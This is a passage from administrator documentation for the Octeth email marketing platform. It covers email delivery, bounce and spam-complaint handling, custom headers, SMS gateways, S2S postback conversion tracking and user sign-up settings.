- **Password** - Your SMTP password (generated when creating SMTP credentials)

::: info Finding Your SES Endpoint
The endpoint depends on your AWS region:
- `email-smtp.us-east-1.amazonaws.com` - US East (N. Virginia)
- `email-smtp.us-west-2.amazonaws.com` - US West (Oregon)
- `email-smtp.eu-west-1.amazonaws.com` - Europe (Ireland)

Check the SES console in your AWS region for the correct endpoint.
:::

**Save to Disk Configuration:**

- **Directory Path** - The server directory where email files will be saved (e.g., `/var/www/html/data/emails/`)

::: warning File System Permissions
The directory must exist and be writable by the web server user (typically `www-data` or `apache`). Each email is saved as a separate `.eml` file with a timestamp and unique identifier.
:::

**Testing Your Email Delivery Settings**

After configuring your send method, click the **Test Email Delivery Settings** button at the bottom of the page. This sends a test email to verify that your configuration works correctly.

::: tip
Always test your email delivery settings after making changes. The test email is sent to the alert recipient address, set on the staff **Your profile** screen.
:::

### Bounce Handling Tab

Bounce handling processes email bounces (undeliverable emails) and automatically updates subscriber statuses to maintain list hygiene and protect your sender reputation.

**Bounce Forward To**

An optional email address where all bounce messages will be forwarded. This creates a copy of every bounce notification for your records or external processing systems.

Example: `bounces-archive@yourdomain.com`

::: tip
Use this field if you want to:
- Archive all bounces for compliance purposes
- Process bounces with external systems
- Monitor bounce patterns manually
- Feed bounce data into a data warehouse or analytics platform

Leave it empty if you only want Octeth to process bounces automatically.
:::

**Bounce Catchall Domain**

The domain used to create unique bounce email addresses for tracking. Each email sent includes a unique bounce address (e.g., `bounce-abc123@yourdomain.com`) that allows Octeth to identify which email bounced.

Example: `bounce.yourdomain.com`

::: danger Critical Configuration Requirement
This domain must be:
1. **Properly configured in DNS** - Point it to your Octeth server
2. **Set up as a catch-all** - Accept emails for any address at this domain
3. **Different from your sending domain** - Use a dedicated subdomain

Without proper configuration, bounce processing will not work, and bounced emails will not be tracked.
:::

::: details Setting Up a Bounce Domain
1. Create a subdomain like `bounce.yourdomain.com`
2. Add an MX record pointing to your Octeth server
3. Configure your server to accept all emails for this domain (catch-all)
4. Test by sending an email to `test-anything@bounce.yourdomain.com` and verify it arrives

Example DNS configuration:
```
bounce.yourdomain.com.    MX    10    mail.yourserver.com.
```
:::

**Soft Bounce Threshold**

The number of consecutive soft bounces (temporary delivery failures) before Octeth treats the address as a hard bounce (permanent failure).

Example: If set to `3`, an address that soft-bounces 3 times in a row will be marked as a hard bounce and removed from future sends.

::: info Soft vs. Hard Bounces
- **Soft Bounce** - Temporary failure (mailbox full, server temporarily unavailable)
- **Hard Bounce** - Permanent failure (address doesn't exist, domain invalid)

Soft bounces can resolve themselves (e.g., when mailbox space is freed), but repeated soft bounces usually indicate a permanent problem.
:::

::: tip Recommended Threshold
A threshold of `3-5` soft bounces works well for most use cases:
- `3` - More aggressive, faster list cleaning
- `5` - More lenient, gives temporary issues more time to resolve
- `7+` - Very lenient, may result in sending to dead addresses longer than necessary
:::

**Send Bounce Notification Email**

When enabled, Octeth sends an email notification to the administrator when bounces are detected. This helps you stay informed about delivery issues.

::: warning Notification Volume
For high-volume sending, bounce notifications can generate hundreds of emails per day. Consider disabling this for production campaigns and rely on bounce reports in the Octeth dashboard instead.
:::

**POP3 Bounce Status**

Controls whether Octeth checks a POP3 mailbox for bounce messages. This is useful when your bounce emails are delivered to a POP3 mailbox rather than being processed directly by Octeth.

Options:
- **Enabled** - Octeth connects to a POP3 mailbox to retrieve and process bounces
- **Disabled** - Octeth only processes bounces delivered directly via SMTP

When enabled, you must configure:

- **Host** - The POP3 server hostname (e.g., `mail.yourdomain.com`)
- **Port** - The POP3 port number (typically `110` for plain POP3, or `995` for SSL)
- **Username** - The POP3 account username
- **Password** - The POP3 account password
- **SSL** - Whether to use SSL encryption for the POP3 connection

::: info When to Use POP3 Bounce Processing
Use POP3 bounce processing if:
- Your email infrastructure forwards bounces to a specific mailbox
- You can't configure direct SMTP delivery of bounces to Octeth
- You're using a third-party email service that delivers bounces via email

Most modern setups process bounces directly via SMTP and don't need POP3 processing.
:::

::: tip POP3 Processing Best Practices
- Use a dedicated mailbox exclusively for bounces
- Enable SSL for security
- Configure Octeth to check the mailbox frequently (every 5-15 minutes)
- Monitor mailbox storage to ensure it doesn't fill up
- Use strong authentication credentials
:::

### Spam Complaint Handling Tab

Spam complaint handling processes feedback loop (FBL) reports from email providers when recipients mark your emails as spam. Proper handling maintains your sender reputation and ensures compliance with anti-spam regulations.

**Report Abuse Email**

The email address shown in abuse reports and List-Unsubscribe headers. Recipients and email providers can contact this address to report spam or abuse.

Example: `abuse@yourdomain.com`

::: danger Compliance Requirement
This email address must:
- Be actively monitored by a real person
- Respond to abuse complaints within 24-48 hours
- Be clearly associated with your organization
- Be capable of receiving high volumes of email

Failure to monitor this address can result in blacklisting and legal consequences under anti-spam laws like CAN-SPAM (US) and CASL (Canada).
:::

**X-Complaints-To**

The email address added to the `X-Complaints-To` email header. Many email providers use this header to route spam complaints.

You can use either:
- A specific email address: `complaints@yourdomain.com`
- A dynamic address: `complaints@%sender_domain%` (uses the sender's domain)

::: tip Dynamic Sender Domain
Using `@%sender_domain%` is useful in multi-tenant installations where each user has their own sending domain. The system automatically replaces `%sender_domain%` with the actual sender domain for each email.
:::

**FBL Incoming Email Address**

An optional email address where feedback loop (FBL) reports from email providers are sent. Major email providers (like Gmail, Yahoo, Outlook) send standardized abuse reports to this address when users mark emails as spam.

Example: `fbl@yourdomain.com`

::: info Setting Up Feedback Loops
To receive FBL reports:
1. Register with each email provider's FBL program:
   - Yahoo: https://help.yahoo.com/kb/postmaster/SLN3434.html
   - Microsoft/Outlook: https://sendersupport.olc.protection.outlook.com/snds/
   - Gmail: Uses its Postmaster Tools (no FBL program)
2. Provide this email address when registering
3. Configure Octeth to process FBL emails (see POP3 FBL Status below)
:::

**Unsubscribe Incoming Email Address**

An optional email address that processes email-based unsubscribe requests. When specified, unsubscribe links in your emails can include this address, allowing recipients to unsubscribe by sending an email.

Example: `unsubscribe@yourdomain.com`

::: warning Modern Unsubscribe Methods
Email-based unsubscribe (clicking a mailto: link) is outdated and problematic:
- Lower success rates (many email clients block mailto: links)
- Requires users to send an email manually
- Slower processing
- Less reliable

Modern best practice is to use HTTP-based unsubscribe links (one-click unsubscribe) handled through Octeth's web interface. Only configure this if you have a specific requirement for email-based unsubscribes.
:::

**POP3 FBL Status**

Controls whether Octeth checks a POP3 mailbox for feedback loop (FBL) reports and spam complaints.

Options:
- **Enabled** - Octeth connects to a POP3 mailbox to retrieve and process FBL reports
- **Disabled** - FBL processing is handled differently or not at all

When enabled, you must configure:

- **Host** - The POP3 server hostname (e.g., `mail.yourdomain.com`)
- **Port** - The POP3 port number (typically `110` for plain POP3, or `995` for SSL)
- **Username** - The POP3 account username
- **Password** - The POP3 account password
- **SSL** - Whether to use SSL encryption for the POP3 connection

::: info FBL Processing Workflow
When enabled, Octeth:
1. Connects to the POP3 mailbox at regular intervals
2. Downloads FBL reports and spam complaints
3. Parses the standardized FBL format
4. Automatically unsubscribes complainers
5. Marks subscribers as "complained" in the database
6. Deletes processed messages from the mailbox
:::

::: tip FBL Mailbox Setup
- Use a dedicated mailbox exclusively for FBL reports
- Don't use this mailbox for other purposes
- Enable SSL for security
- Monitor storage to prevent the mailbox from filling up
- Check that Octeth processes messages successfully (monitor logs)
:::

### Headers Tab

Custom email headers allow you to add metadata to your emails for categorization, tracking, and routing purposes. Headers are invisible to recipients but visible in the email's technical headers.

**What Are Custom Headers?**

Email headers are key-value pairs added to the email message that provide information about the email. While recipients never see these headers in their inbox, they're visible when viewing the email's raw source or headers.

Common uses for custom headers:
- **MTA Categorization** - Help your mail server categorize and prioritize emails
- **Tracking and Analytics** - Add identifiers for external tracking systems
- **Routing Rules** - Trigger specific handling rules in email infrastructure
- **Debugging** - Add information for troubleshooting delivery issues
- **Compliance** - Include required metadata for regulatory compliance

**Viewing Existing Headers**

The headers table shows all configured custom headers with:
- **Header Name** - The name of the header (e.g., `X-Campaign-Type`)
- **Scope** - Which delivery server this header applies to (or "Global" for all)
- **Email Type** - Which type of emails include this header
- **Header Value** - The value assigned to this header

You can select multiple headers using the checkboxes and delete them using the link at the bottom of the table.

**Adding a New Header**

To add a custom email header:

1. Scroll to the "Add a New Header" section
2. Enter the header name, email type, header value, and scope
3. Click **Add Header**

**Header Name**

The name of your custom header. Header names should:
- Start with `X-` to indicate a custom header (convention, not required)
- Use alphanumeric characters and hyphens
- Be descriptive of the header's purpose

Examples:
- `X-Campaign-ID` - Identifies the campaign
- `X-List-Category` - Categorizes the mailing list
- `X-Priority-Level` - Indicates email priority

::: tip Header Naming Conventions
While you can name headers anything, following these conventions helps:
- Prefix custom headers with `X-` (e.g., `X-Custom-Field`)
- Use title case with hyphens (e.g., `X-My-Custom-Header`)
- Make names descriptive and self-documenting
- Avoid conflicts with standard headers (don't use names like `From`, `To`, `Subject`)
:::

**Email Type**

Choose which type of emails will include this header:
- **All** - Added to all emails (campaigns, autoresponders, transactional)
- **Campaign** - Only added to regular email campaigns
- **Autoresponder** - Only added to autoresponder emails
- **Transactional** - Only added to transactional emails

::: info
Select "All" when the header should apply universally. Choose specific types when you need different headers for different email categories.
:::

**Header Value**

The value assigned to this header. This can be:
- **Static text** - A fixed value (e.g., `production`)
- **Personalization tags** - Dynamic values replaced at send time

Available personalization tags include:
- `%User:UserID%` - The sending user's ID
- `%User:EmailAddress%` - The sending user's email address
- `%UserGroup:UserGroupID%` - The user group ID
- `%Campaign:CampaignID%` - The campaign ID
- `%Campaign:CampaignName%` - The campaign name
- `%List:ListID%` - The mailing list ID
- `%Subscriber:SubscriberID%` - The recipient's subscriber ID
- `%Subscriber:EmailAddress%` - The recipient's email address
- `%Journey:JourneyID%` - The journey ID (for journey builder emails)
- `%Journey:ActionID%` - The journey action ID

::: warning Tag Validation
Invalid or unsupported merge tags will be automatically removed from header values during email delivery. Only use the tags listed in the dropdown menu or documented for your Octeth version.
:::

Example header values:
```
campaign-%Campaign:CampaignID%
user-%User:UserID%-list-%List:ListID%
subscriber:%Subscriber:EmailAddress%
```

**Scope**

Choose whether this header applies globally or only to specific delivery servers:
- **Global** - Added to all emails regardless of which delivery server is used
- **Specific Delivery Server** - Only added when emails are sent through a particular delivery server

::: tip When to Use Delivery Server Scope
Use delivery server-specific headers when:
- Different servers need different categorization
- You're A/B testing email infrastructure
- Specific servers require unique identifiers for routing
- You need to track which infrastructure handled each email

Use global scope for universal tracking and categorization that applies regardless of delivery infrastructure.
:::

**Common Header Examples**

Here are practical examples of custom headers:

**Campaign Tracking Header:**
```
Name: X-Campaign-ID
Type: Campaign
Value: %Campaign:CampaignID%
Scope: Global
```

**User Identification:**
```
Name: X-Sender-ID
Type: All
Value: user-%User:UserID%
Scope: Global
```

**List Categorization:**
```
Name: X-List-Category
Type: Campaign
Value: list-%List:ListID%
Scope: Global
```

**Priority Routing:**
```
Name: X-Priority-Level
Type: Transactional
Value: high
Scope: Specific Delivery Server
```

::: tip Testing Headers
After adding custom headers:
1. Send a test email
2. View the raw email source (most email clients have a "View Source" or "Show Original" option)
3. Verify your custom headers appear correctly in the email headers
4. Confirm personalization tags are replaced with actual values
:::

**Saving Your Settings**

After configuring all tabs, click **UPDATE EMAIL DELIVERY SETTINGS** at the bottom of the page to save your changes.

::: danger Test Before Production
After saving email delivery settings:
1. Click **Test Email Delivery Settings** to send a test email
2. Verify the test email arrives successfully
3. Check spam folders if the test doesn't arrive
4. Review email headers to confirm your configuration is correct

Never deploy to production without testing your email delivery configuration first. A misconfigured email delivery system can result in bounces, spam filtering, or complete delivery failure.
:::

::: warning Delivery Server Priority
If you have both Email Delivery Settings and Delivery Servers configured, Octeth uses this priority:
1. **Campaign-specific Delivery Server** - If a campaign specifies a server, use that
2. **[Delivery Routes](../new-user-interface/staff-delivery-routes)** - If a route matches the recipient's MX host, campaign email uses the route's server
3. **User Group Delivery Server** - If the user's group has a default server, use that
4. **Global Email Delivery Settings** - Fall back to these SMTP settings

Most production installations should rely on Delivery Servers and use these global settings only as a backup.
:::

## SMS Gateways

SMS Gateways are connections between Octeth and SMS service providers that enable you to send text messages to your subscribers. Each gateway represents a configured account with an SMS provider (like Twilio, Vonage, or other SMS services) that handles the actual message delivery.

SMS gateways are managed on the staff **Delivery > SMS gateways** screen, see [Managing SMS Gateways in the Staff Area](/v6.0.4/new-user-interface/staff-sms-gateways). The classic admin section forwards there.

::: info Production Setup
Before you can send SMS campaigns, you need at least one active SMS gateway configured. Each gateway connects to an SMS service provider that you've signed up with separately. Octeth doesn't provide SMS sending - it integrates with your existing SMS provider accounts.
:::

### Creating a New SMS Gateway

To create a new gateway, click **Create a new SMS gateway** from the SMS Gateways page. The create form has four cards: **Gateway**, **Provider settings**, **SMS settings** and **Accounts**.

### Basic Settings Tab

This tab configures the fundamental properties of your SMS gateway.

**Gateway Name**

Give your gateway a descriptive name that helps you identify it later. This is especially important if you have multiple gateways configured.

Examples of good gateway names:
```
Twilio - US Numbers
Vonage - International
Testing Gateway - Sandbox
Customer Notifications - Production
```

::: tip Naming Convention
Use names that describe the purpose or geographic scope of the gateway. If you have multiple accounts with the same provider, include information that distinguishes them, like "Production" vs "Testing" or regional identifiers like "US" or "Europe".
:::

**Gateway Type**

Select your SMS service provider from the dropdown menu. Available options depend on which SMS provider integrations are installed in your Octeth system.

Common gateway types include:
- Twilio
- Vonage (formerly Nexmo)
- MessageBird
- Plivo
- Other supported providers

::: warning Cannot Be Changed
Once you create a gateway and save it, you cannot change the gateway type. If you need to switch providers, you must create a new gateway. Choose carefully when setting up your gateway for the first time.
:::

**Gateway Status**

Set whether this gateway is ready to use:
- **Active** - The gateway can be used for sending SMS messages
- **Inactive** - The gateway is disabled and won't be used for sending

::: tip When to Use Inactive
Set a gateway to Inactive when:
- You're still testing the configuration and don't want it used yet
- You need to temporarily disable a provider without deleting the gateway
- You're migrating to a new provider but want to keep the old one configured as backup
- You've hit your provider's spending limit and need to pause sending
:::

**Make this gateway available to all users (Global)**

Check this box to make the gateway available to all users in your Octeth installation. Uncheck it to limit the gateway to specific users.

**Global vs. User-Specific Gateways:**

- **Global Gateway** (checkbox checked) - All users can select this gateway when creating SMS campaigns. You don't need to assign specific users. This is useful for shared infrastructure or when all users should have the same SMS sending capabilities.

- **User-Specific Gateway** (checkbox unchecked) - Only assigned users can use this gateway. You must select which users can access it in the User Assignment tab. This is useful when:
  - Different users have their own SMS provider accounts
  - You want to control SMS sending access for billing or compliance reasons
  - You're testing a gateway with a limited group before making it globally available
  - Different users have different geographic or regulatory requirements

::: warning User Assignment Required
If you uncheck the global option, you MUST assign at least one user in the User Assignment tab. Non-global gateways with no assigned users cannot be saved.
:::

### Gateway Configuration Tab

This tab contains settings specific to your chosen SMS provider. The fields that appear here depend on which Gateway Type you selected in the Basic Settings tab.

::: info Dynamic Configuration
You won't see any fields in this tab until you select a Gateway Type in the Basic Settings tab and move to the Gateway Configuration tab. Each SMS provider requires different credentials and settings.
:::

**Common Configuration Fields:**

The exact fields vary by provider, but typically include:

**API Key / Account SID**
Your authentication credentials from the SMS provider. You'll find this in your provider's dashboard, usually under account settings or API credentials.

Example field names:
- `API Key` (MessageBird, Plivo)
- `Account SID` (Twilio)
- `API Key` (Vonage)

**API Secret / Auth Token**
A second credential that works together with your API key for authentication.

Example field names:
- `Auth Token` (Twilio)
- `API Secret` (Vonage, MessageBird)
- `Auth ID` (Plivo)

**API Base URL** (some providers)
The web address where Octeth connects to your provider's API. Most providers use a standard URL that's pre-filled, but some allow custom endpoints.

::: tip Finding Your Credentials
To locate your API credentials:

1. Log into your SMS provider's dashboard
2. Navigate to Settings, Account, or API section
3. Look for "API Credentials", "API Keys", or "Account Information"
4. Copy the credentials exactly as shown - they're often case-sensitive

If you can't find your credentials, check your provider's documentation or contact their support team.
:::

**Testing Your Configuration**

Once you've entered your gateway credentials, click the **TEST CONNECTION** button to verify that Octeth can successfully connect to your SMS provider.

The test will:
- Verify your credentials are correct
- Check that your account is active
- Confirm Octeth can communicate with the provider's API
- Report any connection issues or authentication errors

::: warning Test Before Saving
Always test your connection before clicking CREATE. If the test fails, double-check your credentials and account status with your SMS provider. A successful test doesn't send any actual SMS messages - it only verifies the connection.
:::

### SMS Settings Tab

This tab configures how SMS messages are sent through this gateway.

**Sender Numbers**

Enter the phone numbers you've registered with your SMS provider that will appear as the "from" number when recipients receive your messages. Enter one phone number per line.

Format requirements:
- Include the country code
- Start with a `+` symbol
- No spaces, dashes, or parentheses

Examples:
```
+12125551234
+442071234567
+61291234567
```

::: tip Sender Number Registration
Most SMS providers require you to register or purchase phone numbers before you can use them as sender IDs. You cannot use random numbers - they must be provisioned through your SMS provider's platform.

Some providers also support alphanumeric sender IDs (like "MyCompany") in certain countries. Check with your provider for availability and registration requirements.
:::

**Message Concatenation Limit**

SMS messages have a character limit (typically 160 characters for standard text). When your message exceeds this limit, it must be split into multiple parts that are reassembled by the recipient's phone.

This setting controls how many message parts can be combined for a single long message. Value must be between 1 and 10, with a default of 3.

Examples:
- `1` - Messages limited to 160 characters (single part only)
- `3` - Messages can be up to ~480 characters (three parts) - **Default**
- `5` - Messages can be up to ~800 characters (five parts)
- `10` - Messages can be up to ~1,600 characters (ten parts)

::: warning Cost Considerations
Each message part is billed separately by your SMS provider. A 3-part message costs 3× as much as a single message. Higher concatenation limits give you more flexibility but can significantly increase costs if users create very long messages.

Most SMS campaigns work well with the default limit of 3 parts. Only increase this if you have a specific need for longer messages and understand the cost implications.
:::

**Default Sender Number**

Select which sender number should be used by default when users create SMS campaigns with this gateway. This field is only populated after you've added sender numbers in the field above.

::: tip
Leave this empty if you want users to choose the sender number each time they create a campaign, or select a default to simplify campaign creation.
:::

**URL Shortening Domains**

Optional: Enter custom domains to use for shortening links in SMS messages. Enter one domain per line.

You can enter:
- Just the domain name: `short.link`
- Full URL with http: `http://s.link`
- Full URL with https: `https://short.link`

If you enter just a domain name, it will automatically use `https://`.

Examples:
```
txt.company.com
go.mybrand.com
https://link.example.com
```

::: warning DNS Configuration Required
Each domain you list here MUST point to your Octeth installation using a CNAME DNS record. If the domain isn't configured correctly, your shortened links won't work and recipients will see errors when they click them.

To set up a shortening domain:
1. Create a CNAME record pointing to your main Octeth domain
2. Test that the domain resolves to your Octeth installation
3. Add the domain to this field
4. Verify link shortening works by sending a test SMS
:::

::: info Why Use Custom Domains?
Custom shortening domains provide:
- **Brand recognition** - Recipients see your domain instead of a generic link shortener
- **Trust** - Links from your own domain are less likely to be flagged as spam
- **Analytics** - Track click-through rates on your branded domain
- **Compliance** - Some industries require branded links for regulatory reasons

You can leave this field empty to use Octeth's default link shortening, or skip link shortening entirely.
:::

**Country Restrictions**

Optional: Limit which countries can receive SMS messages through this gateway. Enter two-letter ISO country codes (one per line). Leave empty to allow all countries.

Examples:
```
US
CA
GB
AU
DE
```

::: tip Finding Country Codes
Country codes use the ISO 3166-1 alpha-2 standard. Find codes at:
- [Wikipedia - ISO 3166-1 alpha-2](https://en.wikipedia.org/wiki/ISO_3166-1_alpha-2)
- Your SMS provider's documentation
- Google "ISO country code" + country name

Common codes: US (United States), GB (United Kingdom), CA (Canada), AU (Australia), DE (Germany), FR (France), JP (Japan), CN (China)
:::

**When to Use Country Restrictions:**

- **Compliance requirements** - Some industries can only send to specific countries
- **Provider limitations** - Your SMS provider may only support certain countries
- **Cost control** - Block expensive international destinations
- **Geographic targeting** - Restrict campaigns to your service area
- **Regulatory requirements** - GDPR, TCPA, or other regulations may limit where you can send

::: warning Effect on Campaigns
If a recipient's phone number is from a restricted country, they will be skipped during campaign sending. Octeth will log these skips so you can review them later. Make sure your country restrictions align with your subscriber base to avoid accidentally blocking legitimate recipients.
:::

### User Assignment Tab

This tab only appears and is only required if you unchecked "Make this gateway available to all users (Global)" in the Basic Settings tab.

**Assign Users**

Select which users should have access to this gateway. Only checked users will be able to:
- Select this gateway when creating SMS campaigns
- View this gateway in their available SMS gateway list
- Send messages through this provider

The user list shows:
- **Company Name** (in bold, if provided)
- **Full Name** (First and Last name)
- **Email Address**

::: tip Selecting Multiple Users
- Click **Select All Users** to quickly assign the gateway to everyone
- Individually check boxes to select specific users
- Use the search or scroll through the list for large user bases
:::

**When User Assignment is Required:**

You MUST assign at least one user if the gateway is not global. The system will prevent you from saving if:
- The gateway is set to non-global (user-specific)
- No users are selected in this tab

**Managing User Access:**

::: info User Assignment Best Practices
- **Department-based assignment** - Create separate gateways for different departments (Sales, Support, Marketing)
- **Billing separation** - Assign gateways by who pays for SMS credits
- **Regional assignment** - Assign based on geographic responsibility
- **Testing vs. Production** - Limit test gateway access to technical users only

You can always edit the user assignment later without affecting the gateway's other settings.
:::

### Saving Your Gateway

Once you've configured all the required settings:

1. Review each tab to ensure all required fields are filled
2. Test the connection in the Gateway Configuration tab
3. Click **CREATE** at the bottom of the page

If validation fails, you'll see error messages indicating which fields need attention. Common errors:
- Missing required credentials in Gateway Configuration
- Invalid phone number format in Sender Numbers
- Invalid country codes in Country Restrictions
- No users assigned for a non-global gateway

::: tip
The gateway will be saved with the status you selected (Active or Inactive). You can always edit these settings later by clicking the gateway name from the SMS Gateways list.
:::

### Managing Existing Gateways

The SMS Gateways list page shows all configured gateways with their key information:

**Gateway Information Displayed:**
- **Gateway Name** - The name you assigned
- **Type** - The SMS provider (Twilio, Vonage, etc.)
- **Status** - Active (green checkmark) or Inactive (gray X)
- **Scope** - Global (blue globe icon) or User-specific (gray user icon)
- **Users** - Number of assigned users (N/A for global gateways)
- **Sender Numbers** - Preview of configured phone numbers

**Actions You Can Take:**
- **Edit** - Click the gateway name or the Edit link to modify settings
- **Delete** - Select one or more gateways and click Delete to remove them

::: warning Deleting Active Gateways
If you delete a gateway that's currently being used in active SMS campaigns, those campaigns may fail to send. Make sure to:
1. Check if any campaigns are using the gateway
2. Reassign campaigns to a different gateway before deleting
3. Set the gateway to Inactive first and monitor for issues before deleting permanently
:::

### Best Practices

**Gateway Organization:**
- Use clear, descriptive names that indicate purpose and provider
- Set up at least one backup gateway for redundancy
- Keep test and production gateways separate
- Document which gateway is used for which purpose

**Security:**
- Keep API credentials confidential - never share them publicly
- Rotate API keys periodically following your provider's recommendations
- Use Inactive status instead of deleting when temporarily disabling
- Review user assignments regularly for non-global gateways

**Cost Management:**
- Monitor message concatenation limits to control costs
- Use country restrictions to prevent sending to expensive destinations
- Review SMS provider bills regularly and compare with Octeth send logs
- Set spending limits with your SMS provider to prevent unexpected charges

**Reliability:**
- Always test connections before making a gateway active
- Configure multiple gateways for failover capability
- Monitor gateway performance and delivery rates
- Keep your provider account in good standing (paid balance, verified identity)

::: info Multiple Gateway Strategy
Many production deployments configure:
1. **Primary Gateway** - Your main SMS provider for production sending
2. **Secondary Gateway** - A backup provider in case the primary has issues
3. **Testing Gateway** - Sandbox or development account for testing campaigns
4. **Regional Gateways** - Specialized providers for specific countries or regions

This approach provides redundancy and allows you to optimize costs and delivery rates by geographic region.
:::

## Delivery Routes

Delivery routes send campaign email through a chosen delivery server when the recipient's MX host matches a host name or a PCRE pattern. They are managed on the staff **Delivery > Delivery routes** screen, see [Routing Email by Recipient Mail Server](../new-user-interface/staff-delivery-routes).

## S2S Postback

S2S Postback (Server-to-Server Postback) allows external services and platforms to send conversion data back to Octeth when someone who clicked a link in your email campaign completes a valuable action. This creates a complete picture of your email campaign performance beyond opens and clicks.

To access these settings, sign in to the new interface as an administrator with the Settings permission and open **Settings > S2S postback** in the staff sidebar. See [The Staff S2S Postback Screen](/v6.0.4/new-user-interface/staff-s2s-postback).

**What Are Conversions?**

A conversion happens when someone takes a desired action after clicking a link in your email. Common conversion examples include:

- Making a purchase in your online store
- Signing up for a trial or subscription
- Completing a registration form
- Downloading a resource
- Booking an appointment or demo

**How S2S Postback Works**

When someone clicks a link in your email campaign, Octeth adds a unique tracking identifier to the URL. After the recipient completes an action on your website or platform, your system (or a third-party service like Clickbank) sends a notification back to Octeth with details about what happened. This allows Octeth to connect email clicks to actual business outcomes.

::: info Why This Matters
Without S2S Postback, you only know that someone clicked your email link. With S2S Postback configured, you can see:
- Which email campaigns generate the most sales
- The revenue generated by each campaign
- Which audience segments convert best
- Return on investment (ROI) for your email marketing
:::

**S2S Postback URL**

This is the web address that receives conversion notifications from external services. The URL is automatically generated by Octeth and cannot be changed.

Example: `http://yourdomain.com/system/s2s-postback/`

::: tip Setting Up Your Integration
Copy this URL and configure it in your:
- E-commerce platform's webhook settings
- Payment processor's postback configuration
- Affiliate network's conversion tracking
- Custom application's notification system

Your external service will send conversion data to this URL whenever a tracked action occurs.
:::

**Special Integration: Clickbank**

If you're integrating with Clickbank (a popular digital product marketplace and affiliate platform), Octeth provides a dedicated URL format. The system displays the exact Clickbank integration URL you need to use.

**Track Parameter**

The name of the URL parameter that contains the unique tracking identifier. This identifier connects a conversion back to the original email click.

Default value: `ocrid`

Example: When someone clicks a link in your email, the URL becomes `https://yoursite.com/product?ocrid=abc123xyz`. Your system includes this `ocrid` value when sending the conversion notification back to Octeth.

::: warning Important
Click links carry the tracking identifier as `ocrid` whatever this name is set to, and the links of campaigns already sent keep the name they were sent with. If you change it, your website, e-commerce platform or third-party service must send the identifier back under the new name, or Octeth cannot match conversions to email campaigns. The screen asks you to confirm a rename.
:::

**Channel**

The name of the URL parameter that identifies which channel or category the conversion belongs to. This allows you to break down your conversion metrics by different sources or types.

Default value: `channel`

Example uses for channels:
- Product categories: `channel=electronics`, `channel=clothing`
- Traffic sources: `channel=email`, `channel=social`, `channel=affiliate`
- Campaign types: `channel=promotional`, `channel=transactional`
- Geographic regions: `channel=north-america`, `channel=europe`

::: tip Optional But Valuable
The channel parameter is optional. Your external service doesn't have to include it when reporting conversions. However, adding channel information helps you understand which types of campaigns or products perform best.
:::

**Value**

The name of the URL parameter that contains the monetary value or amount of the conversion. This lets you track revenue generated by your email campaigns.

Default value: `value`

Example: If someone purchases a product for $49.99 after clicking your email link, your system sends `value=49.99` in the conversion notification.

::: info Tracking Revenue
Always send the value in the smallest currency unit without symbols:
- Correct: `value=49.99`
- Incorrect: `value=$49.99` or `value=49`

The value helps you calculate important metrics like:
- Total revenue per campaign
- Average order value from email traffic
- Revenue per email sent
- Return on investment (ROI)
:::

**Unit**

The name of the URL parameter that specifies the currency or unit of measurement for the conversion value.

Default value: `unit`

Example: If the conversion value is in US dollars, your system sends `unit=USD`. For other currencies, use the appropriate currency code (`EUR`, `GBP`, `CAD`, etc.).

**Example S2S Postback Request**

When someone clicks an email link and completes a purchase, your system would send a request like this to Octeth's S2S Postback URL:

```
http://yourdomain.com/system/s2s-postback/?ocrid=abc123xyz&channel=electronics&value=149.99&unit=USD
```

This tells Octeth:
- The conversion is linked to tracking ID `abc123xyz`
- It came through the `electronics` channel
- The purchase value was `149.99`
- The currency is US dollars (`USD`)

Octeth then records this conversion and associates it with the correct email campaign, allowing you to see conversion metrics in your campaign reports.

::: tip Integration Testing
After configuring S2S Postback settings:
1. Send yourself a test email campaign
2. Click a link in the email and note the tracking parameter in the URL
3. Manually trigger a test conversion with that tracking ID
4. Check your campaign statistics to verify the conversion was recorded

This confirms your integration is working correctly before running live campaigns.
:::

## ESP Settings

ESP Settings control how new users can sign up for accounts, payment processing, and customer billing. These settings are essential if you plan to offer Octeth as a service to customers, run it as a multi-tenant platform, or allow users to self-register and purchase email credits.

**Navigation:** **Settings** → **ESP Settings**

The ESP Settings page has four main tabs that work together to create your customer onboarding and payment experience:
- **User Sign-Up** - Controls whether users can create their own accounts and what information they provide
- **Currency and Tax** - Sets the currency and tax rate for all credit purchases
- **Notification Emails** - Customizes receipt emails sent to customers after credit purchases
- **Payment Gateway** - Configures PayPal or custom payment processors for collecting payments

::: info When to Configure ESP Settings
Configure ESP Settings if you're running Octeth as a service where:
- Customers sign up and create their own user accounts
- Users purchase email credits through your platform
- You need to collect payment for email sending services
- You're operating a multi-tenant email marketing platform

If you're using Octeth internally (single organization, manually created user accounts), you can skip most ESP Settings configuration.
:::

### User Sign-Up

The User Sign-Up tab controls whether new users can register for accounts themselves and what happens when they do.

**Allow users to sign up from your website**

Choose whether to enable or disable self-service user registration:
- **Enabled** - Users can create their own accounts through a signup form on your website
- **Disabled** - Only administrators can create user accounts through the admin panel

When enabled, Octeth generates a registration page you can link to from your website. Users fill out a form, and their account is created automatically.

::: warning Security Consideration
Enabling public signup means anyone with the registration link can create an account. Consider using reputation settings and approval workflows to prevent abuse.
:::

**Default reputation for new signups**

When self-registration is enabled, you must choose the default trust level for new accounts:

- **Trusted** - New users can send emails immediately without restrictions. Their emails are treated as legitimate from the start.
- **Untrusted** - New users have limited sending ability until they build a reputation. This helps prevent spam abuse on your platform.

This setting applies to every self-signup: the legacy signup form, single sign-on and the new user interface's registration page. It is also the reputation an account gets when `user.create` is called without `ReputationLevel`. An `Untrusted` account's campaigns wait for administrator approval, and it cannot send through the Email Gateway (HTTP API or SMTP relay) until an administrator marks it `Trusted`. Paying for a plan does not change an account's reputation.

::: tip Preventing Spam Abuse
For public-facing signup forms, set default reputation to **Untrusted**. This protects your sending infrastructure from spammers who might try to abuse your platform. You can manually upgrade legitimate users to Trusted status after verifying their use case.
:::

**Required signup fields**

Choose which information to collect during the registration process. Check the boxes for fields you want to require from new users:

- **First Name** - User's given name
- **Last Name** - User's family name
- **Company Name** - Organization name
- **Website** - Company or personal website URL
- **Street** - Street address
- **City** - City name
- **State** - State or province
- **Zip** - Postal code
- **Country** - Country of residence
- **Phone** - Contact phone number
- **Fax** - Fax number (rarely used today)
- **TimeZone** - User's local timezone
- **Language** - Preferred interface language

You can select multiple fields. Only request information you actually need - longer forms reduce signup conversion rates.

::: tip Form Field Strategy
For basic email marketing accounts, collect just **First Name**, **Last Name**, **Company Name**, and **Email** (always required). You can request additional information later if needed for billing or compliance.
:::

**Default language**

